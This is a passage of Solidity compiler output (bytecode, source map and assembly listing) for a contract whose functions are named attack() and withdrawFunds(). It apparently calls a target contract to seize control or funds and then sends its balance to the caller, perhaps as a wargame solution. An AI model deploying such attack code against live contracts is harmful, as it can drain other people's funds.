DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x32D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x30A JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x38F JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x394 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH25 0xD72D13197AF382750082F44FF3E24B4958F690DB36DD80F5A1 CREATE SWAP12 SELFDESTRUCT 0xB2 JUMPI SWAP14 PUSH5 0x736F6C6343 STOP MOD DIV STOP CALLER ",
							"sourceMap": "6925:884:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;7636:95:0;;5:9:-1;2:2;;;27:1;24;17:12;2:2;7636:95:0;;;:::i;:::-;;7184:336;;5:9:-1;2:2;;;27:1;24;17:12;2:2;7184:336:0;;;:::i;:::-;;7636:95;7681:10;:19;;:42;7701:21;7681:42;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;7681:42:0;7636:95::o;7184:336::-;7314:16;;;;;;;;;;;:21;;7385:4;7336:55;;;;;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;7336:55:0;;;;;;;38:4:-1;29:7;25:18;67:10;61:17;96:58;199:8;192:4;186;182:15;179:29;167:10;160:49;0:215;;;7336:55:0;7314:78;;;;;;;;;;;;;36:153:-1;66:2;61:3;58:11;36:153;;182:3;176:10;171:3;164:23;98:2;93:3;89:12;82:19;;123:2;118:3;114:12;107:19;;148:2;143:3;139:12;132:19;;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;7314:78:0;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;7314:78:0;;7449:16;;;;;;;;;;;:21;;7471:40;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;7471:40:0;;;;;;;38:4:-1;29:7;25:18;67:10;61:17;96:58;199:8;192:4;186;182:15;179:29;167:10;160:49;0:215;;;7471:40:0;7449:63;;;;;;;;;;;;;36:153:-1;66:2;61:3;58:11;36:153;;182:3;176:10;171:3;164:23;98:2;93:3;89:12;82:19;;123:2;118:3;114:12;107:19;;148:2;143:3;139:12;132:19;;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;7449:63:0;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;7449:63:0;;7184:336::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "195000",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attack()": "infinite",
								"withdrawFunds()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 6925,
									"end": 7809,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7122,
									"end": 7133,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7119,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 7103,
									"end": 7119,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 7103,
									"end": 7133,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 7052,
									"end": 7174,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 6925,
									"end": 7809,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122078d72d13197af382750082f44ff3e24b4958f690db36dd80f5a1f09bffb2579d64736f6c63430006040033",
									".code": [
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH",
											"source": 0,
											"value": "24600FC3"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH",
											"source": 0,
											"value": "9E5FAAFC"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 6925,
											"end": 7809,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "7"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "7"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7691,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7700,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7681,
											"end": 7700,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 7701,
											"end": 7722,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "15"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "15"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 7681,
											"end": 7723,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7636,
											"end": 7731,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 7184,
											"end": 7520,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7314,
											"end": 7330,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7314,
											"end": 7335,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7314,
											"end": 7335,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7385,
											"end": 7389,
											"name": "ADDRESS",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "19AB453C00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 7336,
											"end": 7391,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 38,
											"end": 42,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 29,
											"end": 36,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 67,
											"end": 77,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 96,
											"end": 154,
											"name": "PUSH",
											"source": -1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 199,
											"end": 207,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 192,
											"end": 196,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 186,
											"end": 190,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 167,
											"end": 177,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 160,
